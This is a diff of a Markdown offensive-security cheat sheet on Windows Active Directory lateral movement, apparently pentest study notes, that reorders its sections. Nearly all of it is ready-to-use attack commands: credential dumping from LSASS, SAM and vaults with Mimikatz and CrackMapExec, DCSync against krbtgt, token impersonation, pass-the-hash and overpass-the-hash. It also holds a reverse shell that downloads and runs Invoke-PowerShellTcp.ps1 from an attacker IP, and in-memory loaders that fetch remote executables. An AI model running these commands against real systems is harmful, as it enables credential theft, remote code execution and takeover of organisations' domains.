@@ -1,13 +1,16 @@
 # Lateral Movement
 * [General](#General)
-* [Find credentials in files](#Find-credentials-in-files)
-* [Dumping LSASS](#Dumping-LSASS)
+* [Gathering Credentials](#Gathering credentials)
+  * [Find credentials in files](#Find-credentials-in-files)
+  * [Dumping LSASS](#Dumping-LSASS)
+  * [Dumping SAM](#Dumping-SAM)
+  * [Mimikatz](#Mimikatz) 
+  * [DC-Sync](#DC-Sync)
+  * [Token manipulation](#Token-manipulation)
 * [Overpass The Hash](#Overpass-The-Hash)
-* [DC-Sync](#DC-Sync)
-* [Offensive .NET](#Offensive-.NET)
-* [Mimikatz](#Mimikatz) 
-* [Token manipulation](#Token-manipulation)
+* [Pass The Hash](#Pass-The-Hash)
 * [Check Local Admin Access](#Check-Local-Admin-Access)  
+* [Offensive .NET](#Offensive-.NET)
 
 ## General
 #### Add domain user to localadmin
@@ -51,38 +54,8 @@ runas /netonly /user:<DOMAIN>\<USER> cmd.exe
 runas /netonly /user:<DOMAIN>\<USER> powershell.exe
 ```
 
-#### Psexec
-- if enter-pssession fails:
-```
-.\psexec64.exe \\<COMPUTERNAME
-```
-
-#### Psexec pass the hash
-- Uses an empty hash
-```
-.\psexec64.exe \\<COMPUTERNAME -accepteula -s -u <DOMAIN>\<USER> -p aad3b435b51404eeaad3b435b51404ee:<NTLM HASH> cmd.exe
-```
-
-## Double hop
-#### Pssession in pssession
-```
-Enter-PSSession -ComputerName <NAME>
-#in session
-$sess = New-PSSession <SERVER> -Credential <DOMAIN>\<USER>
-Invoke-Command -Scriptblock {hostname; whoami;} -Session $sess
-```
-
-#### Overpass the hash mimikatz reverse shell
-```
-powercat -l -v -p 444 -t 5000
-
-$sess = New-PSSession <SERVER> 
-#.ps1 is a reverse shell back to the attacker machine, make sure you run it as the user you want
-$Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''))'; Out-File -Encoding Ascii -InputObject $Contents -FilePath reverse.bat
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:C:\reverse.bat"'
-```
-
-## Find credentials in files
+## Gathering credentials
+### Find credentials in files
 #### Look for SAM files
 ```
 Get-ChildItem -path C:\Windows\Repair\* -include *.SAM*,*.SYSTEM* -force -Recurse 
@@ -127,7 +100,13 @@ $vault = New-Object Windows.Security.Credentials.PasswordVault
 $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
 ```
 
-## Dumping LSASS
+### Dumping LSASS
+#### Crackmapexec
+```
+cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> --lsa
+cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> -M lsassy
+```
+
 #### Dump credentials on a local machine using Mimikatz.
 ```
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 
@@ -159,12 +138,137 @@ tasklist /FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS PROCESS ID> C:\Users\Public\lsass.dmp full
 ```
 
-#### From a Linux attacking machine using impacket.
+## Dumping SAM
+#### Crackmapexec
+```
+cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> --lsa
+cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> -M lsassy
+```
+
+#### Mimikatz dump SAM
+```
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
+```
+
+or
+
+```
+reg save HKLM\SAM SamBkup.hiv
+reg save HKLM\System SystemBkup.hiv
+#Start mimikatz as administrator
+privilege::debug
+token::elevate
+lsadump::sam SamBkup.hiv SystemBkup.hiv
+```
+
+## Mimikatz
+#### Mimikatz dump credentials on local machine
+```
+Invoke-Mimikatz -Dumpcreds
+```
+
+#### Mimikatz dump credentials on multiple remote machines
+```
+Invoke-Mimikatz -Dumpcreds -ComputerName @("<COMPUTERNAME 1>","<COMPUTERNAME2>")
+```
+
+#### Mimikatz dump certs
+```
+Invoke-Mimikatz –DumpCerts
+```
+
+#### Mimikatz dump vault
+```
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred" "vault::list"'
+```
+
+#### Mimikatz dump all to find privs
+```
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "kerberos::list /export" "vault::cred" "vault::list" "lsadump::sam" "lsadump::secrets" "lsadump::cache"'
+```
+
+## DC Sync
+- Extract creds from the DC without code execution using DA privileges.
+
+#### Mimikatz DCSync attack
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+```
+
+#### Safetykatz.exe
+```
+SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+```
+
+## Token manipulation
+- https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
+
+#### List all tokens on a machine
+```
+Invoke-TokenManipulation –ShowAll
+```
+
+#### List all unique, usable tokens on the machine
+```
+Invoke-TokenManipulation -Enumerate
+```
+
+#### Start a new process with token of a specific user
+```
+Invoke-TokenManipulation -ImpersonateUser -Username “domain\user"
+```
+
+#### Start news process with token of another process
+```
+Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
+```
+
+## Check Local Admin Access
+#### Crackmapexec
+```
+cme smb <COMPUTERLIST> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+```
+
+#### Powerview
+```
+Find-LocalAdminAccess -Verbose
+```
+
+### Other scripts
+```
+. ./Find-WMILocalAdminAccess.ps1
+Find-WMILocalAdminAccess
+```
+
+```
+. ./Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess
+```
 
 
-#### From a Linux attacking machine using Physmem2profit
 
-## Overpass The Hash
+## Pass the hash
+#### Psexec
+- Empty LM hash: ```aad3b435b51404eeaad3b435b51404ee```
+- Doesn't seem to work all the time though!
+```
+.\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <DOMAIN>\<ADMINISTRATOR -p <LM HASH>:<NTLM HASH> cmd.exe
+```
+
+#### Crackmapexec
+- Required elevated privileges to execute commands
+```
+cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> -X <COMMAND>
+```
+
+#### Invoke-TheHash
+- https://github.com/Kevin-Robertson/Invoke-TheHash
+- Can use the command ```net localgroup administrators <DOMAIN>\<USERNAME> /add``` and do ```enter-pssession``` after to connect 
+```
+Invoke-SMBExec -Target <COMPUTERNAME> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM HASH> -Command <COMMAND> -Verbose
+```
+
+### Overpass The Hash
 - Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
 
 #### Mimikatz overpass the hash
@@ -194,17 +298,22 @@ Rubeus.exe asktgt /user:<USER> /rc4:<NTLM HASH> /ptt
 Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
-## DC Sync
-- Extract creds from the DC without code execution using DA privileges.
+### Double hop
+#### Pssession in pssession
+```
+Enter-PSSession -ComputerName <NAME>
+$sess = New-PSSession <SERVER> -Credential <DOMAIN>\<USER>
+Invoke-Command -Scriptblock {hostname; whoami;} -Session $sess
+```
 
-#### Mimikatz DCSync attack
+#### Overpass the hash mimikatz reverse shell
 ```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
-```
+powercat -l -v -p 444 -t 5000
 
-#### Safetykatz.exe
-```
-SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+$sess = New-PSSession <SERVER> 
+#.ps1 is a reverse shell back to the attacker machine, make sure you run it as the user you want
+$Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''))'; Out-File -Encoding Ascii -InputObject $Contents -FilePath reverse.bat
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:C:\reverse.bat"'
 ```
 
 ## Offensive .NET
@@ -217,91 +326,4 @@ C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
 #### Use custom exe Assembyload to run netloader in memory and then load binary
 ```
 C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
-```
-
-## Mimikatz
-#### Mimikatz dump credentials on local machine
-```
-Invoke-Mimikatz -Dumpcreds
-```
-
-#### Mimikatz dump credentials on multiple remote machines
-```
-Invoke-Mimikatz -Dumpcreds -ComputerName @("<COMPUTERNAME 1>","<COMPUTERNAME2>")
-```
-
-#### Mimikatz dump SAM
-```
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
-```
-
-or
-
-```
-reg save HKLM\SAM SamBkup.hiv
-reg save HKLM\System SystemBkup.hiv
-#Start mimikatz as administrator
-privilege::debug
-token::elevate
-lsadump::sam SamBkup.hiv SystemBkup.hiv
-```
-
-#### Mimikatz dump lsass
-```
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
-```
-
-#### Mimikatz dump certs
-```
-Invoke-Mimikatz –DumpCerts
-```
-
-#### Mimikatz dump vault
-```
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred" "vault::list"'
-```
-
-#### Mimikatz dump all to find privs
-```
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "kerberos::list /export" "vault::cred" "vault::list" "lsadump::sam" "lsadump::secrets" "lsadump::cache"'
-```
-
-## Token manipulation
-- https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
-
-#### List all tokens on a machine
-```
-Invoke-TokenManipulation –ShowAll
-```
-
-#### List all unique, usable tokens on the machine
-```
-Invoke-TokenManipulation -Enumerate
-```
-
-#### Start a new process with token of a specific user
-```
-Invoke-TokenManipulation -ImpersonateUser -Username “domain\user"
-```
-
-#### Start news process with token of another process
-```
-Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
-```
-
-## Check Local Admin Access
-#### Powerview
-```
-Find-LocalAdminAccess -Verbose
-```
-
-### Other scripts
-```
-. ./Find-WMILocalAdminAccess.ps1
-Find-WMILocalAdminAccess
-```
-
-```
-. ./Find-PSRemotingLocalAdminAccess.ps1
-Find-PSRemotingLocalAdminAccess
 ```
